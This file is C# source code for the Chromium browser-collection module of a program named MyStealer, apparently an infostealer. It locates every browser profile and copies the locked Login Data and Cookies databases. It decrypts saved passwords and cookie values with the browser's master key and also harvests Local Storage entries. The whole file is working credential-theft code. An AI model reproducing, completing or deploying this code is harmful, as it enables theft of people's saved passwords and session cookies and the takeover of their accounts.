using MyStealer.Collector.Utils;
using MyStealer.Collector.Utils.Chromium;
using MyStealer.Collector.Utils.Chromium.LevelDb;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace MyStealer.Collector.Browser
{
    public class Chromium : BrowserCollectorBase
    {
        public override string ModuleName => "Chromium";

        public virtual bool HasProfiles => true;

        protected virtual string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Chromium", "User Data");

        protected virtual string[] CookieFilePathList => new string[] { "Cookies", Path.Combine("Network", "Cookies") };

        private ChromiumDecryptor decryptor;
        private IImmutableSet<string> profileNames;

        public override bool IsAvailable() => File.Exists(Path.Combine(UserDataPath, "Local State"));

        public override void Initialize()
        {
            var localStateFile = Path.Combine(UserDataPath, "Local State");
            var localState = JObject.Parse(File.ReadAllText(localStateFile, encoding: Encoding.UTF8));
            decryptor = new ChromiumDecryptor(localState["os_crypt"]["encrypted_key"].Value<string>());

            if (HasProfiles)
            {
                profileNames = localState["profile"]["profiles_order"].Values<string>().ToImmutableHashSet();
                Logger.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNames));
            }
            else
            {
                profileNames = ImmutableHashSet<string>.Empty;
            }
        }

        public override IImmutableSet<BrowserLogin> GetLogins()
        {
            var set = ImmutableHashSet.CreateBuilder<BrowserLogin>();
            var count = 0;

            if (HasProfiles)
            {
                foreach (var profileName in profileNames)
                {
                    count = DecryptLoginData(set, profileName, Path.Combine(UserDataPath, profileName, "Login Data"));
                    Logger.Information("Read {count} logins from profile: {profile}", count, profileName);
                }
            }
            else
            {
                count = DecryptLoginData(set, "", Path.Combine(UserDataPath, "Login Data"));
            }

            Logger.Information("Read {count} logins in total.", count);
            return set.ToImmutable();
        }

        public override IImmutableSet<BrowserCookie> GetCookies()
        {
            var set = ImmutableHashSet.CreateBuilder<BrowserCookie>();
            var count = 0;

            foreach (var cookiePath in CookieFilePathList)
            {
                if (HasProfiles)
                {
                    foreach (var profileName in profileNames)
                    {
                        count = DecryptCookies(set, profileName, Path.Combine(UserDataPath, profileName, cookiePath));
                        Logger.Information("Read {count} cookies from profile: {profile}", count, profileName);
                    }
                }
                else
                {
                    count = DecryptCookies(set, "", Path.Combine(UserDataPath, cookiePath));
                }
            }

            Logger.Information("Read {count} cookies in total.", count);
            return set.ToImmutable();
        }

        public override IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries()
        {
            var set = ImmutableHashSet.CreateBuilder<BrowserLocalStorage>();
            var count = 0;

            if (HasProfiles)
            {
                foreach (var profileName in profileNames)
                {
                    count = ReadLocalStorage(set, profileName, Path.Combine(UserDataPath, profileName, "Local Storage", "leveldb"));
                    Logger.Information("Read {count} Local Storage entries from profile: {profile}", count, profileName);
                }
            }
            else
            {
                count = ReadLocalStorage(set, "", Path.Combine(UserDataPath, "Local Storage", "leveldb"));
            }

            Logger.Information("Read {count} Local Storage entries in total.", count);
            return set.ToImmutable();
        }

        private string GetEncryptedString(SQLiteDataReader reader, int i)
        {
            var bufferSize = (int)reader.GetBytes(i, 0, null, 0, 0);
            var buffer = BytePool.Alloc(bufferSize); // the real buffer size may be bigger than `bufferSize`
            try
            {
                reader.GetBytes(i, 0, buffer, 0, bufferSize);
                return decryptor.Decrypt(bufferSize, buffer);
            }
            finally
            {
                BytePool.Free(buffer);
            }
        }

        protected int DecryptLoginData(ISet<BrowserLogin> creds, string profileName, string loginDataPath)
        {
            if (!File.Exists(loginDataPath))
            {
                Logger.Warning("Login Data file does not exists: {path}", loginDataPath);
                return 0;
            }

            Logger.Information("Begin parsing Login Data file: {path}", loginDataPath);

            var copyName = Path.GetRandomFileName();
            File.Copy(loginDataPath, copyName, true); // prevent reading locked sql database
            Logger.Debug("Login Data file {path} copied to {randomName}", loginDataPath, copyName);

            var count = 0;
            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var host = reader.GetString(0);
                            var username = reader.GetString(1);
                            var password = GetEncryptedString(reader, 2);

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                            {
                                count++;
                                creds.Add(new BrowserLogin
                                {
                                    BrowserName = $"{ModuleName}",
                                    BrowserProfileName = profileName,
                                    Host = host,
                                    UserName = username,
                                    Password = password
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "Error reading login entries from file: {path}", loginDataPath);
            }
            finally
            {
                File.Delete(copyName);
            }

            return count;
        }

        protected int DecryptCookies(ISet<BrowserCookie> cookies, string profileName, string cookieFile)
        {
            if (!File.Exists(cookieFile))
            {
                Logger.Warning("Cookies file does not exists: {path}", profileName, cookieFile);
                return 0;
            }

            Logger.Information("Begin parsing Cookies file: {path}", profileName, cookieFile);

            var copyName = Path.GetRandomFileName();
            File.Copy(cookieFile, copyName, true); // prevent reading locked sql database
            Logger.Debug("Login Data file {path} copied to {randomName}", profileName, cookieFile, copyName);

            var count = 0;
            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT creation_utc,last_access_utc,expires_utc,priority,samesite,host_key,name,path,value,encrypted_value,is_secure,is_httponly FROM cookies;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var creationTime = reader.GetInt64(0);
                            var lastAccessTime = reader.GetInt64(1);
                            var expireTime = reader.GetInt64(2);
                            var priority = reader.GetInt16(3);
                            var sameSite = reader.GetInt16(4);
                            var host = reader.GetString(5);
                            var name = reader.GetString(6);
                            var path = reader.GetString(7);
                            var value = reader.GetString(8); // legacy value
                            if (value.Length == 0)
                                value = GetEncryptedString(reader, 9);

                            var isSecure = reader.GetInt16(10);
                            var isHttpOnly = reader.GetInt16(11);

                            // https://stackoverflow.com/a/43520042
                            var creationDate = new DateTime(Math.Max(0, creationTime / 1000000 - 11644473600), DateTimeKind.Utc);
                            var accessDate = new DateTime(Math.Max(0, lastAccessTime / 1000000 - 11644473600), DateTimeKind.Utc);
                            var expireDate = new DateTime(Math.Max(0, expireTime / 1000000 - 11644473600), DateTimeKind.Utc);

                            // Same_Site
                            // -1 : Undefined
                            // 0 : None
                            // 1 : Lax
                            // 2 : Strict

                            if (!string.IsNullOrEmpty(name))
                            {
                                count++;
                                cookies.Add(new BrowserCookie
                                {
                                    BrowserName = ModuleName,
                                    BrowserProfileName = profileName,
                                    CreationDateTime = creationDate,
                                    LastAccessDateTime = accessDate,
                                    ExpireDateTime = expireDate,
                                    Host = host,
                                    Path = path,
                                    Name = name,
                                    Value = value,
                                    IsSecure = isSecure != 0,
                                    IsHttpOnly = isHttpOnly != 0,
                                    SameSite = sameSite,
                                    Priority = priority
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "Error reading cookie entries from file: {path}", cookieFile);
            }
            finally
            {
                File.Delete(copyName);
            }

            return count;
        }

        protected int ReadLocalStorage(ISet<BrowserLocalStorage> set, string profileName, string levelDbPath)
        {
            var count = 0;
            try
            {
                var localStorageDb = new CclChromiumLocalStorage.LocalStoreDb(levelDbPath);

                foreach (var record in localStorageDb.EnumerateRecords())
                {
                    var batch = localStorageDb.FindBatch(record.Seq);
                    var timeStamp = DateTime.MinValue;
                    if (batch != null)
                        timeStamp = batch.TimeStamp;

                    count++;
                    set.Add(new BrowserLocalStorage
                    {
                        BrowserName = ModuleName,
                        BrowserProfileName = profileName,
                        Host = record.StorageKey,
                        Key = record.ScriptKey,
                        Value = record.Value,
                        AccessTimeStamp = timeStamp
                    });
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error reading Local Storage database: {path}", levelDbPath);
            }

            return count;
        }
    }
}
